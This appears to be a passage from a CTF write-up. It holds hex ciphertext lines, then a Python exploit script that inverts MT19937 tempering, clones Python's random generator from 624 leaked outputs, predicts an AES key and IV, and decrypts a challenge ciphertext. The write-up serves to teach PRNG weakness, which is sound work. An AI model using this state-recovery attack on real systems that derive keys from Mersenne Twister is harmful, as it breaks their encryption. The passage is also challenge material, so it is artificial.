</span></span><span class=line><span class=cl>126680e057dab63c8a2be438274a408da07f8da041ee19f0658e1d265e910790
</span></span><span class=line><span class=cl>f3c2f2dc52d7f9c10ece7a4027a245493d795ea09d84d636c2bdd022ba6d2ea1
</span></span><span class=line><span class=cl>604139f41f4e8fb36addba8ba4927b8a19a7cc94293730a0c161d86896231327
</span></span><span class=line><span class=cl>9c4e34681c8a4d1fbdf6ca7e8c95c55cdef7245bed1f91b28c3c2cdb1b097539
</span></span><span class=line><span class=cl>dca5ecba50a715afa72ef129a5a362006b27f8052cee1b0059f7c730a25a7c42
</span></span><span class=line><span class=cl>a1a9d5d3908c39e7bd5031ac0655258c29c648a17af5b48a215c78fdec321d3f
</span></span><span class=line><span class=cl>0cf22e15d1008f7869d3b704933ce3f5c2ef499beb073b82e6c26ded89c2f906
</span></span><span class=line><span class=cl>c29452f131012382691d03e2a65ae9ee699464d887c955313dbf7e20c859f95a
</span></span><span class=line><span class=cl>db65f7fadcb252311d3b6a33e6d8227b6c8e54beb3d7a96f7b4357949cc1be90
</span></span><span class=line><span class=cl>4dfb6785937ce36342c052343b39548b29ad52045d4a09072f556efb669d9f41
</span></span><span class=line><span class=cl>07a476f87b59fdb7250cb0714df5bb3452ae1524861e1fcecb99dc0d27418254
</span></span><span class=line><span class=cl>daf9037b36048782a8a1516a12c5d474a2378a1ad331c387974308982cf2883e
</span></span><span class=line><span class=cl>cd9dad6f232f8624da75aae07ffd17160100353ca969eef53cefb4a1fcd42a83
</span></span><span class=line><span class=cl>8480e927fc0f443019a85d01be8ae9d1ea576edbf35344995378747d2b764869
</span></span><span class=line><span class=cl>e6b5e75ed510b6388f06a620b257f457f979c14aac2f0ae88d359c8e307d5888
</span></span><span class=line><span class=cl>f9081962d3832ff938086c6cf5f62794a628f819e389348ed2d69adc4f255b1c
</span></span><span class=line><span class=cl>06c4e65975cdd3131f0884dbffa89731334501aeec8b42d876287acba540a85e
</span></span><span class=line><span class=cl>29e020873179463f8b506a11b12ee9928814ff63068d0ed998b5cb819353edb1
</span></span><span class=line><span class=cl>ab7c6bf36df31c10583906b235ae5dd003049e13ce0686ebe2c0ad68b259a5b4
</span></span><span class=line><span class=cl>be60f2468883f18939d29132e0c8995db02c58784cfdf40d6ac99f36b7e64491
</span></span><span class=line><span class=cl>ae4909df1efc187cba89894c8406b137bdb36e348801829f82aee163e3d817f3
</span></span><span class=line><span class=cl>5ecbebdb40f25bf3b1fe7e712cf102926e3177aa185d898ce74fff187057d33a
</span></span><span class=line><span class=cl>3aa5cb59194d5486ffead594e73e110dc707187d607c1fef4c82e8328144b554
</span></span><span class=line><span class=cl>ad68bfa0244d5388a467a20b3c9595bd1375e7f7f40b491d3d997e519cd0e3ac
</span></span><span class=line><span class=cl>e2a4dbf32124e0d7ccafa8d4cf99fd29e3dc3dca2ada08ca3e240a3668e181f4
</span></span><span class=line><span class=cl>1d9838b0ef79192b9a31df9817da702ef03aeb7d326115badc8e293df7ca2d42
</span></span><span class=line><span class=cl>d42809ba018786eb9e3667a81d2c4f0e3932c515246f04ad028c5e2b50886b10
</span></span><span class=line><span class=cl>dcb3f0fc6e6d7f9da4d1cdd08d27895f11e57ce0874ad15d0b211f25235a05e6
</span></span><span class=line><span class=cl>0548ef65280d29cb898f3e31c28d4c49c7bd70f212442424089968bdd7a5cec9
</span></span><span class=line><span class=cl>5cb9f7809efe4dd9f42135155e0c6f0e7232a6eb08d55aea0fba14b02498a55b
</span></span><span class=line><span class=cl>3ca556899e09feac17e3f3aed18923b036c79e60d8cd8cef79d492a40931e43b
</span></span><span class=line><span class=cl>3b45af4ce5fb810ecc5746b10e1ad16b584d8e8d6c97feb3019a1e012cd59c07
</span></span><span class=line><span class=cl>a0f082cbd745c9a19bb5a9e75fcf3828de5e5c80ef348c03eddef96764a1c2b2
</span></span><span class=line><span class=cl>9b997ffb9338919a3b0e8343b861a716fca238bbb12b17b3ce512fcfc98b81ac
</span></span><span class=line><span class=cl>4219e4aaf16294c2bdf3f8acb6631c8938076f9ca2eb4249ea4361f5be54e74c
</span></span><span class=line><span class=cl>aaa0dba9be4536cba8d347467bbe9a0abc9f4dd6d1cd7b0805433d9c0d3775f6
</span></span><span class=line><span class=cl>846d3ad979102d2fe92c878756e62fc1eb9f053b101c8453e098659e82015abd
</span></span><span class=line><span class=cl>1106b76b1111eac09dcdbf2be3f0487f2f5a6b1f9fd0c8bda70b39bd5f1c0997
</span></span><span class=line><span class=cl>2c951232ed5119cc40345deb2d8b49744f6b18feb337415bfb9ce7f842996661
</span></span><span class=line><span class=cl>c9c95d976faad0a1916437d90b0c1f4892d12cd86ac76a01396372165ebeb004
</span></span><span class=line><span class=cl>d90ba28e46dc437e89681a7d56e8b4d7663204b5730017473603496bd1064df4
</span></span><span class=line><span class=cl>8b89a78e31e45728bdd871ecd053680634f95d8072be341b11e3f369f0056d97
</span></span><span class=line><span class=cl>b49734c0dcf1265c9438a3b4b0d11adeb686d08402d8bc6d8d1666dc7642f108
</span></span><span class=line><span class=cl>0b0272cda3d9ea11cb82bc879a4f66b6a7c0e6c07ce0f6212427d6f236ba7dad
</span></span><span class=line><span class=cl>1e0bf71ea2c408b23eddce7c049273220711e44de98e1992bcb17436f042ffae
</span></span><span class=line><span class=cl>46ecdb9117a20df61d5d38fcee9599c994b25aed236abacf7ab0e179bc8d31c0
</span></span><span class=line><span class=cl>49113def916159dc85b9538fa95a878d5a95310a94b55bb0432d0bd5a569fc7d
</span></span><span class=line><span class=cl>a02f9cbfe508ffe30f34a15f4a08ffd3666daadb2cd07659c8f63e7b226eb524
</span></span><span class=line><span class=cl>c69ac42848cf97a8494f64046511d2eafbf46f845c1e399cb2ac06d7ec04c7f4
</span></span><span class=line><span class=cl>fbe242d3e9a16ee0a8f7e998ab7a89e3b7dcb9e946f50fa6e5d88fd16048ac18
</span></span><span class=line><span class=cl>15c148d5921cdc0422b09e7eb730f5b34590bebee9466a0e6ced74d9537b4097
</span></span><span class=line><span class=cl>a54e882b872c0a4db1ee0f223c2379e03bcd80190dc2c4b7ea172a8ce002a214
</span></span><span class=line><span class=cl>8e342bd8b0fb41eeed5e5752fbc262f4129b8fa507ea59df14dec8ea4e37ab1f
</span></span><span class=line><span class=cl>c7b7a669983c9820ccd99b22cce81244bf88a5a1a93034cfc6ee213132970052
</span></span><span class=line><span class=cl>bdaf02db79ebf45d31c6fe44a5a27806df414bf096c02668a07c7ce79de71fa9
</span></span><span class=line><span class=cl>d8b1bc159423a2e2fe7965123a654ec5ec217f1facf40378dd09dea13bb46f14
</span></span><span class=line><span class=cl>d344de666fe87a2d9f8088346256940fd712e35884a239be0811979e806833f5
</span></span><span class=line><span class=cl>4dc15c7eddc2b29fee61e1afe619f88d02fd182ddee693469e697e520026a6eb
</span></span><span class=line><span class=cl>ab402f124aa008441622880c8c4c44cc7056b601bd05987312254bc3a3ff2c18
</span></span><span class=line><span class=cl>2f0b3447b12fecef779f951f448825fbf39884760eaa7ba35306b3701f179bf5
</span></span><span class=line><span class=cl>e90eb9893e5ea13632e87113adfb127375ae809ace4644e00ba92624ab145a9c
</span></span><span class=line><span class=cl>7d50f8fb66501741afc73ff263e2f14010e681f2929cec456d805b175f5b8b70
</span></span><span class=line><span class=cl>4fe5cef03002dfa80b12ae98c02a2dee672b0b3d61da22f356942b01fe768e54
</span></span><span class=line><span class=cl>bd59177b9d3210c180869e49c911e51d3fd6514fdcc5385cdb238ed84c39d433
</span></span><span class=line><span class=cl>754872df076267e530f4166390f174a3b1837f15b9d5ed0525e52597ffbe8e8d
</span></span><span class=line><span class=cl>26c9a0302719d70643a332b64175123e7f39d7d0e678360aaf3216602c4ac0e2
</span></span><span class=line><span class=cl>0e7dd8f5c42fd7c165dd2bd7f5b0ea680881b00a628e94a2b5773e9320aec38b
</span></span><span class=line><span class=cl>6c2184a3846cfd947c6c53098ceef860354b6c7521801c12cc5599263ef1c494
</span></span><span class=line><span class=cl>d6c8ee28416034dfc600a808cee4bac52f0a121e7be2b5c0b3729e4cc01fd969
</span></span><span class=line><span class=cl>d40771421b3a4e36f4f1d1fa8b4fdd2087a50a65338da4d37e229093e2828ad3
</span></span><span class=line><span class=cl>0eaf8c3a2d135977d08883b6c208f0573b65c1b5bba0d29008554b3b3cbc7e02
</span></span><span class=line><span class=cl>65c7cf6d1f6a4dbe2048f6885a5ae5c3e86e731b1b6c906454a9ab767a2d3ea1
</span></span><span class=line><span class=cl>4c001337ca33fa955f2c805d4df9f97edc17d6721db6b6d1df99eaba7863099a
</span></span><span class=line><span class=cl>54c0d42bc4865a121da07ca974b9141b12cd1b867cfa3804dcab44127e0b290a
</span></span><span class=line><span class=cl>58a95796178c46c95775a8d6605aa9b945593cf819f759d13ef4b8b0e44c98d7
</span></span><span class=line><span class=cl>a5463f1844ab5da502187c19d7d756648c1cce184aa6e462ec7f6542ce663876
</span></span><span class=line><span class=cl>6af9613022dbeb448e4012fa25b8f8a85bcab68214b93e4e8d5e106fa12284e3
</span></span><span class=line><span class=cl>5a50c315a6277c757431f39bb968cc2d8076e7b78945ba243484972b7111a7cb
</span></span><span class=line><span class=cl>97536d568a90e14f3433950bbf723951ba7f8ac65da0a2416a96c9d52ead393f
</span></span><span class=line><span class=cl>334a10b7b771084474c6f7b8b387a04420eb041a0054a854c1468848bcc41d41
</span></span><span class=line><span class=cl>6d46f81228fa03cca145893e714dbebec330ea60ae891e35f0328fe5d2ab339f
</span></span><span class=line><span class=cl>29a8213526d500fc3085e4bb9b7737fb7efe08486413908a4559de03271e3cda
</span></span><span class=line><span class=cl>1575b821b1d51a058cafb376d0eca059233cbf9685a05646d90d7b7c65175499
</span></span><span class=line><span class=cl>9c451d8ac0f4bc7aa7aac9ecb7d6ad3415f7e5ec5f5eca29b15009ddbec441c2
</span></span><span class=line><span class=cl>1c7e36ded4a0adc5028ccc4a1a3a1933db60c7b572e7803eae915f805cce6da7
</span></span><span class=line><span class=cl>c704765730e0cab4a09922a74d7ca9938442f2a3b670e019b6663ef38f685acb
</span></span><span class=line><span class=cl>75c6a84df9f8ce83726a9245900c6ebd0c74e7c15c67dd19ad1ed9daf6bba036
</span></span><span class=line><span class=cl>deb5371493b066c89fecbe74fce0e72385944f437012d66391f2b915a833c737
</span></span><span class=line><span class=cl>501434ee33b9793a74f30f123f68f4a9258d7fc25a38844a3da84ace0db5ee49
</span></span><span class=line><span class=cl>e09d6bedf5103e3aeab900600f762183fbe4afb28734ab50a7073881811749c4
</span></span><span class=line><span class=cl>1e4281aa53d40ff9f1e4bc8f1a57b727f41841c496bc3faef195766e4f92c585
</span></span><span class=line><span class=cl>67add12cdb45c6aa7a951f01e8abec6d080f689e02a875d58a3435c2f6fa3f32
</span></span><span class=line><span class=cl>2e1fb81b8ce5f95fecd44b6ed8f722896f2338451a2db55d72a253aa0e4b2ff3
</span></span><span class=line><span class=cl>eade2870fb2f57808ce21e48c0dee8c9ece000e31b713e04969829ed02db7ab4
</span></span><span class=line><span class=cl>6a6a63dbebc9155762006c9a83d81164af358b8be2009716b758d6005e337dcf
</span></span><span class=line><span class=cl>db0e0e67b6ac76ff9703e788573ac8839a6a1bf93fa4d8ae3aa1d2b40c972f38
</span></span><span class=line><span class=cl>b72a3e7dbeab5d9fe82db7d90fc7f64022ce63d30f9ac908d78805e05cb9f9b8
</span></span><span class=line><span class=cl>b8e77c26d41ecda42cd97d6371a35ca01f21f0eb862dc84b628c5b24be806618
</span></span><span class=line><span class=cl>a6648ed549941b669180b58479e078251831edccc85440350a373bf72dfe95a8
</span></span><span class=line><span class=cl>5826de6fe0e6aa44a98f1f5be8852e26a4cfd2c68050eb83ad6efbb7cbd23788
</span></span><span class=line><span class=cl>414e1162941672109fbe8779dac40f4fe3321a56c78a96a2d5c29ce634021e4f
</span></span><span class=line><span class=cl>7ccea3d9bf227b1b361a07697ff57d219ddd8bc0e29bf8b3527288bdc990475c
</span></span><span class=line><span class=cl>bf209259c873de30aac23bbe3c9f97fb2a2cca7bc5a72327af04d75901965ace
</span></span><span class=line><span class=cl>721ed4f69464e222ecdbd0dfdb3e3848b93604697f823c0d61d2891667bab8f1
</span></span><span class=line><span class=cl>0c429a0c45f28a7bc809c5b39c7eab892864aa7e47d153aef34785f7a077ab86
</span></span><span class=line><span class=cl>23f63c1b82bff79b6fbd061ebcfe28809ee85352e5b16513ac5f227b3d7116f9
</span></span><span class=line><span class=cl>c53262d31ee1cbfe69cc59078165bb77d85ae06f9644369caf65f0e4bdee9c54
</span></span><span class=line><span class=cl>dd8a806cf56ea7fcc751089147656d9188aba0d0d03ddc034a253b83f1a105a1
</span></span><span class=line><span class=cl>68719c5140279c0ae808018e2a220cd1f6ee60b07d6a00c3a12c0f262c67a31a
</span></span><span class=line><span class=cl>e073d9cb8e82c90c27f525c1378a54237dd77405c82dfa153474f82c624fea18
</span></span><span class=line><span class=cl>ebcddbae08f177e153839ff8558fb05278d66930d96a36a54bdbd168dc573860
</span></span><span class=line><span class=cl>55d2ef6fea655cc8af97d7214d2a6d7e2abc2accbfd0466d1c6a8cf7f3b14763
</span></span><span class=line><span class=cl>97981c6d713cdaf88cc9eac2c6128ca25e5ab4ab2f4ffda3228caaf90dc7e67b
</span></span><span class=line><span class=cl>7ce66f0790cd1b693c49789b2706ddbbc9a10628c411fefb4ccecfa4ba2778ef
</span></span><span class=line><span class=cl>7ca24d6b04277ed8eee2124858bddc5d2681d5d94e6a9012959e30ee4c0724ac
</span></span><span class=line><span class=cl>3ec2d101409898975dfb365e2d8f874dcd7678bcbc98b4e87089769ec2e7f685
</span></span><span class=line><span class=cl>e9a25df556c1aa2be1962528c1d5bd863e10e1ba14a3f83b304f71fe1857cd95
</span></span><span class=line><span class=cl>4a3fd03d22a2450ce918d3fd99251351dfb564f641437edfcabfd282b372db0d
</span></span><span class=line><span class=cl>fa12f23f1a72c7bd380f0c64176fc87e2987f9f5214bbc0876861e4bb9102795
</span></span><span class=line><span class=cl>ab585c93c856b80584687ba47a7918f98fee68e658c32da988585aaa2bda9d69
</span></span><span class=line><span class=cl>f4aa811805c5174231e1cf4af0ac871d2f3fec278724523ac28d9001b0b39024
</span></span><span class=line><span class=cl>da8a43912a5f284069215e4333a06d575fca6d4ea48f954a588e43448491c8f6
</span></span><span class=line><span class=cl>51893743292682c8f6b12c26a27f8567b5a1922382d5497b518aec18f16ffb12
</span></span><span class=line><span class=cl>6c9ce423a85adc50e95285dbecf83a4e7f04cb4ff9ca30f410c8f48b0046c10d
</span></span><span class=line><span class=cl>efb1833442382d67c9599684fa19fa43f75cedfce22d6a834aa38e8638b1fe50
</span></span><span class=line><span class=cl>b40d76b40cd8d5b128fbf24e8b6b07c16bfae07ff7d091acec991662b393f6cb
</span></span><span class=line><span class=cl>127b8d6d61c0b28e0f528471aea0ea680bb7cf3bda8839484be85ff3a6d877b2
</span></span><span class=line><span class=cl>37797ad940ea8af197c8ff0e30d658d797c7ae18736c2dbe05824e458cd98216
</span></span><span class=line><span class=cl>50ebfd23cc14a052f935d5954ab16a32a65988b6510af3a5e395969bd939801c
</span></span><span class=line><span class=cl>460903cb027926c1c8268cd7436a0d3aebdd6241b3384e34e259948208d2926c
</span></span><span class=line><span class=cl>de78df60487b09da581d1f47e9efbaf585ff3e8884c3b0cb14cbc5fa8ab9d21e
</span></span><span class=line><span class=cl>a3dbd3ff4c38ed47ea8ef4311698f52696995abe6a2eb6bdbe49f54879032fa3
</span></span><span class=line><span class=cl>0c29736aa22d5d811df9eb31c9c9cce56892d80170d875f3ab57006241e92f75
</span></span><span class=line><span class=cl>9b86b668d2fad02016c6a56e9a15c258518d800fd7795ab0c4dc6b80d2b34dce
</span></span><span class=line><span class=cl>b94334cc1765db1fb2a5a2d2a128d2822bd31dfd45871aa5bfbd74e8e8b2b7f5
</span></span><span class=line><span class=cl>cd7b3935b995eea29d986c758c23df1a58cca61df612422f99958b8a6ad8e09f
</span></span></code></pre></div><p>getrandbits伪随机数预测，至少需要624个32bit数才能预测，getrandbits(64)看成两个getrandbits(32)，先低位后高位</p><p><a href=https://www.anquanke.com/post/id/205861#h3-4 target=_blank rel="noopener noreffer">浅析MT19937伪随机数生成算法-安全客 - 安全资讯平台 (anquanke.com)</a></p><p><a href=https://blog.y7n05h.dev/random/#Random target=_blank rel="noopener noreffer">https://blog.y7n05h.dev/random/#Random</a></p><p>exp.py：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>binascii</span> <span class=kn>import</span> <span class=n>a2b_hex</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>random</span> <span class=kn>import</span> <span class=n>Random</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>invert_right</span><span class=p>(</span><span class=n>m</span><span class=p>,</span><span class=n>l</span><span class=p>,</span><span class=n>val</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>length</span> <span class=o>=</span> <span class=mi>32</span>
</span></span><span class=line><span class=cl>    <span class=n>mx</span> <span class=o>=</span> <span class=mh>0xffffffff</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>val</span> <span class=o>==</span> <span class=s1>&#39;&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>val</span> <span class=o>=</span> <span class=n>mx</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span><span class=p>,</span><span class=n>res</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span><span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>i</span><span class=o>*</span><span class=n>l</span><span class=o>&lt;</span><span class=n>length</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>mask</span> <span class=o>=</span> <span class=p>(</span><span class=n>mx</span><span class=o>&lt;&lt;</span><span class=p>(</span><span class=n>length</span><span class=o>-</span><span class=n>l</span><span class=p>)</span><span class=o>&amp;</span><span class=n>mx</span><span class=p>)</span><span class=o>&gt;&gt;</span><span class=n>i</span><span class=o>*</span><span class=n>l</span>
</span></span><span class=line><span class=cl>        <span class=n>tmp</span> <span class=o>=</span> <span class=n>m</span> <span class=o>&amp;</span> <span class=n>mask</span>
</span></span><span class=line><span class=cl>        <span class=n>m</span> <span class=o>=</span> <span class=n>m</span><span class=o>^</span><span class=n>tmp</span><span class=o>&gt;&gt;</span><span class=n>l</span><span class=o>&amp;</span><span class=n>val</span>
</span></span><span class=line><span class=cl>        <span class=n>res</span> <span class=o>+=</span> <span class=n>tmp</span>
</span></span><span class=line><span class=cl>        <span class=n>i</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>res</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>invert_left</span><span class=p>(</span><span class=n>m</span><span class=p>,</span><span class=n>l</span><span class=p>,</span><span class=n>val</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>length</span> <span class=o>=</span> <span class=mi>32</span>
</span></span><span class=line><span class=cl>    <span class=n>mx</span> <span class=o>=</span> <span class=mh>0xffffffff</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span><span class=p>,</span><span class=n>res</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span><span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>i</span><span class=o>*</span><span class=n>l</span> <span class=o>&lt;</span> <span class=n>length</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>mask</span> <span class=o>=</span> <span class=p>(</span><span class=n>mx</span><span class=o>&gt;&gt;</span><span class=p>(</span><span class=n>length</span><span class=o>-</span><span class=n>l</span><span class=p>)</span><span class=o>&amp;</span><span class=n>mx</span><span class=p>)</span><span class=o>&lt;&lt;</span><span class=n>i</span><span class=o>*</span><span class=n>l</span>
</span></span><span class=line><span class=cl>        <span class=n>tmp</span> <span class=o>=</span> <span class=n>m</span> <span class=o>&amp;</span> <span class=n>mask</span>
</span></span><span class=line><span class=cl>        <span class=n>m</span> <span class=o>^=</span> <span class=n>tmp</span><span class=o>&lt;&lt;</span><span class=n>l</span><span class=o>&amp;</span><span class=n>val</span>
</span></span><span class=line><span class=cl>        <span class=n>res</span> <span class=o>|=</span> <span class=n>tmp</span>
</span></span><span class=line><span class=cl>        <span class=n>i</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>res</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>invert_temper</span><span class=p>(</span><span class=n>m</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>m</span> <span class=o>=</span> <span class=n>invert_right</span><span class=p>(</span><span class=n>m</span><span class=p>,</span><span class=mi>18</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>m</span> <span class=o>=</span> <span class=n>invert_left</span><span class=p>(</span><span class=n>m</span><span class=p>,</span><span class=mi>15</span><span class=p>,</span><span class=mi>4022730752</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>m</span> <span class=o>=</span> <span class=n>invert_left</span><span class=p>(</span><span class=n>m</span><span class=p>,</span><span class=mi>7</span><span class=p>,</span><span class=mi>2636928640</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>m</span> <span class=o>=</span> <span class=n>invert_right</span><span class=p>(</span><span class=n>m</span><span class=p>,</span><span class=mi>11</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>m</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>clone_mt</span><span class=p>(</span><span class=n>record</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>state</span> <span class=o>=</span> <span class=p>[</span><span class=n>invert_temper</span><span class=p>(</span><span class=n>i</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>record</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>gen</span> <span class=o>=</span> <span class=n>Random</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>gen</span><span class=o>.</span><span class=n>setstate</span><span class=p>((</span><span class=mi>3</span><span class=p>,</span><span class=nb>tuple</span><span class=p>(</span><span class=n>state</span><span class=o>+</span><span class=p>[</span><span class=mi>0</span><span class=p>]),</span><span class=kc>None</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>gen</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># f = open(&#34;msg.txt&#34;,&#34;r&#34;)</span>
</span></span><span class=line><span class=cl><span class=c1># w = open(&#34;old_m.txt&#34;,&#34;w&#34;)</span>
</span></span><span class=line><span class=cl><span class=c1># old_key = b&#39;73E5602B54FE63A5&#39;</span>
</span></span><span class=line><span class=cl><span class=c1># old_iv = b&#39;B435AE462FBAA662&#39;</span>
</span></span><span class=line><span class=cl><span class=c1># for old_c in f.readlines():</span>
</span></span><span class=line><span class=cl><span class=c1>#     cryptos = AES.new(old_key,AES.MODE_CBC,old_iv)</span>
</span></span><span class=line><span class=cl><span class=c1>#     old_m = cryptos.decrypt(a2b_hex(old_c.strip(&#34;\n&#34;)))</span>
</span></span><span class=line><span class=cl><span class=c1>#     w.write(&#34;{}\n&#34;.format(old_m.decode()))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>f</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;old_m.txt&#34;</span><span class=p>,</span><span class=s2>&#34;r&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>prng</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>old_m</span> <span class=ow>in</span> <span class=n>f</span><span class=o>.</span><span class=n>readlines</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>n</span> <span class=o>=</span> <span class=p>(</span><span class=n>old_m</span><span class=o>.</span><span class=n>strip</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>n</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>n</span><span class=p>,</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>prng</span><span class=o>.</span><span class=n>append</span><span class=p>((</span><span class=n>n</span><span class=o>&gt;&gt;</span><span class=mi>32</span><span class=p>)</span><span class=o>&amp;</span><span class=mh>0xffffffff</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>prng</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>n</span><span class=o>&gt;&gt;</span><span class=mi>64</span><span class=o>&amp;</span><span class=mh>0xffffffff</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>prng</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>n</span><span class=o>&amp;</span><span class=mh>0xffffffff</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>g</span> <span class=o>=</span> <span class=n>clone_mt</span><span class=p>(</span><span class=n>prng</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>624</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>g</span><span class=o>.</span><span class=n>getrandbits</span><span class=p>(</span><span class=mi>32</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>salt</span> <span class=o>=</span> <span class=n>g</span><span class=o>.</span><span class=n>getrandbits</span><span class=p>(</span><span class=mi>32</span><span class=p>)</span>  <span class=c1># 362819459</span>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=n>g</span><span class=o>.</span><span class=n>getrandbits</span><span class=p>(</span><span class=mi>32</span><span class=p>)</span> <span class=o>+</span> <span class=p>(</span><span class=n>g</span><span class=o>.</span><span class=n>getrandbits</span><span class=p>(</span><span class=mi>32</span><span class=p>)</span><span class=o>&lt;&lt;</span><span class=mi>32</span><span class=p>)</span>  <span class=c1># 17506667538655249967</span>
</span></span><span class=line><span class=cl><span class=n>iv</span> <span class=o>=</span> <span class=n>g</span><span class=o>.</span><span class=n>getrandbits</span><span class=p>(</span><span class=mi>32</span><span class=p>)</span> <span class=o>+</span> <span class=p>(</span><span class=n>g</span><span class=o>.</span><span class=n>getrandbits</span><span class=p>(</span><span class=mi>32</span><span class=p>)</span><span class=o>&lt;&lt;</span><span class=mi>32</span><span class=p>)</span>  <span class=c1># 1253285644132320713</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>salt</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{:X}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>salt</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{:X}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>key</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>iv</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{:X}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>iv</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>c</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;c82dc20b7512d03f1a0982eb8a6e855db20f6fe3ff8d202a6fb74c6522fa6e623c6abe6725cafe78f9624ad59f3e90af6f985f38f75ec4d62ff7e02bd7c2f051&#39;</span>
</span></span><span class=line><span class=cl><span class=n>cryptos</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span><span class=n>AES</span><span class=o>.</span><span class=n>MODE_CBC</span><span class=p>,</span><span class=n>iv</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>m</span> <span class=o>=</span> <span class=n>cryptos</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>a2b_hex</span><span class=p>(</span><span class=n>c</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>c</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>m</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s2>&#34;utf-8&#34;</span><span class=p>,</span><span class=s2>&#34;ignore&#34;</span><span class=p>))</span>
</span></span></code></pre></div><p>old_m.txt：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>799EEED5854C6F6C7E0905B2
</span></span><span class=line><span class=cl>770A6C6EBA0C566FE031A94D
</span></span><span class=line><span class=cl>DFA02A4E0B07EECEF47963F8
</span></span><span class=line><span class=cl>90D566BC3A399EA3A40DF672
</span></span><span class=line><span class=cl>A2B3B2399B3163945D06E5A5
</span></span><span class=line><span class=cl>7DDB0BF1D7FE022FF339FD14
